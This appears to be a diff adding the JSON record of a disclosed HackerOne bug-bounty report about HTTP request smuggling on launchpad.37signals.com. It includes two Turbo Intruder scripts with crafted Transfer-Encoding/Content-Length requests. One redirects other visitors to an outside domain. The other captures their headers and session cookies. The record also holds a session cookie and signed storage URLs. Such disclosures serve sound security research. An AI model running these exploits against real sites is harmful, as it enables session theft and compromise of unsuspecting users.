@@ -1,0 +1,142 @@
+{
+  "id": 867577,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Njc1Nzc=",
+  "url": "https://hackerone.com/reports/867577",
+  "title": "Unauthenticated request smuggling on launchpad.37signals.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-07T04:16:23.389Z",
+  "submitted_at": "2020-05-07T04:16:23.389Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hazimaslam",
+    "url": "/hazimaslam",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4un4VdG5K6SG4UY8M1jXFkXE/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-10-28T14:57:15.180Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-28T14:57:15.129Z",
+  "team_member_agreed_on_going_public_at": "2020-10-27T18:12:16.584Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description\n\nBy sending an ambiguous request on the rails application on `launchpad.37signals.com`, an attacker can desynchronise frontend and backend servers, leaving the socket to the backend server poisoned with a harmful response. This response will then be served up to the next visitor.\n\nThe desync occurs when sending a request with a `Content-Length` header and a valid `Transfer-Encoding` header followed by an invalid `Transfer-Encoding` header. The frontend server only examines the second `Transfer-Encoding` which is invalid, so it uses the `Content-Length` instead. However the backend server prioritises the valid `Transfer-Encoding` header and therefore ignores the `Content-Length`.\n\n## Validation Steps\n\nTo replicate this bug, run the following script in Turbo Intruder. After issuing a desync request, it simulates 6 requests from normal visitors one of which gets redirected to `hazimaslam.com`.\n\n```python\ndef queueRequests(target, wordlists):\n\n    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',\n                           concurrentConnections=3,\n                           requestsPerConnection=2,\n                           resumeSSL=False,\n                           timeout=10,\n                           pipeline=False,\n                           maxRetriesPerRequest=0,\n                           engine=Engine.THREADED,\n                           )\n\n    attack = '''POST /identity HTTP/1.1\nHost: launchpad.37signals.com\nContent-Length: 69\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\nTransfer-Encoding: foo\n\n3\nx=1\n0\n\nGET / HTTP/1.1\nX-Forwarded-Host: hazimaslam.com\nFoo: bar'''\n\n    engine.queue(attack)\n\n    victim = '''GET /signin HTTP/1.1\nHost: launchpad.37signals.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,la;q=0.8\nCookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D\n\n'''\n    for i in range(6):\n        engine.queue(victim)\n        time.sleep(0.05)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n```\n\n{F818615}\n\n### Capturing and storing normal visitors' request headers and cookies\n\nBy prefixing the victim's request with a crafted storage request, we can make the application save their request and display it back to us and steal any authentication cookies/headers.\n\n1. Login and visit https://launchpad.37signals.com/identity/edit\n2. Save changes and intercept the request.\n3. Copy the values of following from intercepted request and paste in the script where indicated:\n\n- identity_id (cookie)\n- session_token (cookie)\n- _launchpad_session (cookie)\n- authenticity_token (parameter)\n\n\n```python\ndef queueRequests(target, wordlists):\n\n    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',\n                           concurrentConnections=3,\n                           requestsPerConnection=2,\n                           resumeSSL=False,\n                           timeout=10,\n                           pipeline=False,\n                           maxRetriesPerRequest=0,\n                           engine=Engine.THREADED,\n                           )\n\n    attack = '''POST /identity HTTP/1.1\nHost: launchpad.37signals.com\nContent-Length: 903\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\nTransfer-Encoding: foo\n\n3\nx=1\n0\n\nPOST /identity HTTP/1.1\nHost: launchpad.37signals.com\nContent-Length: 435\nX-Forwarded-Proto: https\nContent-Type: application/x-www-form-urlencoded\nCookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE\n\n_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''\n\n    engine.queue(attack)\n\n    victim = '''GET /signin HTTP/1.1\nHost: launchpad.37signals.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36\nCookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D\nFoo: bar\n\n'''\n    for i in range(6):\n        engine.queue(victim)\n        time.sleep(0.05)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n```\nRun the script in Turbo Intruder and refresh https://launchpad.37signals.com/identity/edit to see captured headers and cookies.\n\nHere is the video demonstration for this:\n\n{F818731}\n\n## Impact\n\n- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.\n\n- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.\n\n- It is also possible to capture visitors' request headers and cookies.\n\n- No authentication and interaction required.",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 818615,
+      "file_name": "Screenshot_2020-05-07_at_7.51.16_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xVhyTaWBQMyL425A8E5i4oRA?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-05-07_at_7.51.16_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-05-07_at_7.51.16_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WCR4ORR%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCIHTjxBrX%2Fev2v5RJIVO1%2F5LwAEZ%2BFWiBWwEvH%2Fo9TfgOAiBqHJJrfmp6JVTTm30d1c08GpbbOT%2FuZX2ph%2BVKvzXClSq7BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEfRu1wPNVgYWUIugKo8FbRCdyf3NnLoSKZ%2BcSRIGGZhOJ39PKREt93pTLH2Uw8oH5v6xyl6rTVWnxAoAtasMBQbWpG80dfwVF63VIYK3MfiQ9vDTbSdDNEirz4RF78zWEq49rtDzFJ%2BaDLqeJOaXN7epkMzdNdjGIlfGCKjtDf6jy8YCUXKzgQf34kbU8iNTmDgblGnSndWqDhCqxiLc%2BQQ2kQYiu8MwqZxHrGhQw8HjQJBwWkW700ZwFE3Mz%2FV5UA%2By0tuuYbfDutxK2AfiKJSQlnUSIeGhfc%2BFmQLcQMClkXnn2ZfmBrtAwZ0yN37OEsGt7CW9nnOWRn%2BZVBI2KLOOQQ%2FYUt8ZH%2BIXFrxbhbCcJ3uLnOL9%2B6T9Rl9xAsMG5S86Ks%2Bsx4Rt3wZ8Blaxj1cdtdtRkLXJOsBQPk5fJuOufy4ueRWTieL6jYKt6abCuII%2F7ZY57L9cST6Ny%2FiDNbj%2BWOUI97VLRJzXTnOGiC6CGJeIMYmY2FUAu8yDf1DCvGTMSQWD9bqzYFLP%2BiuWppC7yh8TRSefwOJ5xigkhVuupPUzDVvPTlp5urtfbCJr7AFEZyZgx%2FQS8fTatLbRDEpkJyeydzGhkFYNZyuARp3cGE%2FWdkYyAepxzb2LmCCHKvxS5Y1is8QembANHmjpZsX4r6MrfOfEN9ilxXWYRjW1tS7ZE5AFMIxEzMgR5LVgsfyg6FPziUz1UcEF%2BoDaRuhX86yoAzByw3q3jk06w7KffYCZuEapiDxy%2BXSEhRjuU1K4JFchVjLn2I%2FyBI%2FmbH6%2BAzPOJ506w6XJ9kXWPBJJ3G4LvWDyZc3D4FETs%2BylzUMO5tiWiYPEox4uZHtKUZBiEWoNgdnQptjQwRToc%2FUjg%2FVjquNQZ087s7z0njCck%2F3PBjqyAcxRCyrsaU8ZxH0Ud3hlPayew4RitE9YcSsPh%2BtCBowyaDOmvJdePDxZvlB1boDHEHuH%2FMbW9Ip3LGzlFAA%2FqUHi%2Fy7vnTpV%2FpSuJSSCd4fYrwgHbMQMDVqpdaIJ%2BLslpgbp3Sn7%2Fx4oMZxFrpxEhVRCmCGAltgkq3MVXAvZ30yNWlHZ%2FF1jtSe0AkhZJQB2QcRFue2jd4g2pFsm4J3eJTtNYUDx7VnkJfdoW5ti2n7sLfA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=83741c88b6557423fe56a79d3db078d9fe9bb6ab9e7110ee91ad44aa886d290a",
+      "file_size": 333240,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 818731,
+      "file_name": "Screen_Recording_2020-05-07_at_9.02.52_AM.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sS1fNMGBX8oSsPapESZTfqmx?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2020-05-07_at_9.02.52_AM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2020-05-07_at_9.02.52_AM.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WCR4ORR%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCIHTjxBrX%2Fev2v5RJIVO1%2F5LwAEZ%2BFWiBWwEvH%2Fo9TfgOAiBqHJJrfmp6JVTTm30d1c08GpbbOT%2FuZX2ph%2BVKvzXClSq7BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEfRu1wPNVgYWUIugKo8FbRCdyf3NnLoSKZ%2BcSRIGGZhOJ39PKREt93pTLH2Uw8oH5v6xyl6rTVWnxAoAtasMBQbWpG80dfwVF63VIYK3MfiQ9vDTbSdDNEirz4RF78zWEq49rtDzFJ%2BaDLqeJOaXN7epkMzdNdjGIlfGCKjtDf6jy8YCUXKzgQf34kbU8iNTmDgblGnSndWqDhCqxiLc%2BQQ2kQYiu8MwqZxHrGhQw8HjQJBwWkW700ZwFE3Mz%2FV5UA%2By0tuuYbfDutxK2AfiKJSQlnUSIeGhfc%2BFmQLcQMClkXnn2ZfmBrtAwZ0yN37OEsGt7CW9nnOWRn%2BZVBI2KLOOQQ%2FYUt8ZH%2BIXFrxbhbCcJ3uLnOL9%2B6T9Rl9xAsMG5S86Ks%2Bsx4Rt3wZ8Blaxj1cdtdtRkLXJOsBQPk5fJuOufy4ueRWTieL6jYKt6abCuII%2F7ZY57L9cST6Ny%2FiDNbj%2BWOUI97VLRJzXTnOGiC6CGJeIMYmY2FUAu8yDf1DCvGTMSQWD9bqzYFLP%2BiuWppC7yh8TRSefwOJ5xigkhVuupPUzDVvPTlp5urtfbCJr7AFEZyZgx%2FQS8fTatLbRDEpkJyeydzGhkFYNZyuARp3cGE%2FWdkYyAepxzb2LmCCHKvxS5Y1is8QembANHmjpZsX4r6MrfOfEN9ilxXWYRjW1tS7ZE5AFMIxEzMgR5LVgsfyg6FPziUz1UcEF%2BoDaRuhX86yoAzByw3q3jk06w7KffYCZuEapiDxy%2BXSEhRjuU1K4JFchVjLn2I%2FyBI%2FmbH6%2BAzPOJ506w6XJ9kXWPBJJ3G4LvWDyZc3D4FETs%2BylzUMO5tiWiYPEox4uZHtKUZBiEWoNgdnQptjQwRToc%2FUjg%2FVjquNQZ087s7z0njCck%2F3PBjqyAcxRCyrsaU8ZxH0Ud3hlPayew4RitE9YcSsPh%2BtCBowyaDOmvJdePDxZvlB1boDHEHuH%2FMbW9Ip3LGzlFAA%2FqUHi%2Fy7vnTpV%2FpSuJSSCd4fYrwgHbMQMDVqpdaIJ%2BLslpgbp3Sn7%2Fx4oMZxFrpxEhVRCmCGAltgkq3MVXAvZ30yNWlHZ%2FF1jtSe0AkhZJQB2QcRFue2jd4g2pFsm4J3eJTtNYUDx7VnkJfdoW5ti2n7sLfA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5011ecb4fd530e9bf92e0cf30e57dd4e600a3f7d7fbfc344416d624d4ca1a3bd",
+      "file_size": 11543024,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-26T18:12:16.757Z",
+  "allow_singular_disclosure_after": -171925518.41420484,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "arist0phanes",
+    "kanazawaaaa",
+    "n1m0",
+    "drsniper",
+    "fqdn",
+    "poneglyph",
+    "ali",
+    "meryem0x",
+    "t4ym",
+    "d4r3d3v1l",
+    "and 14 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 4656,
+    "asset_type": "URL",
+    "asset_identifier": "launchpad.37signals.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
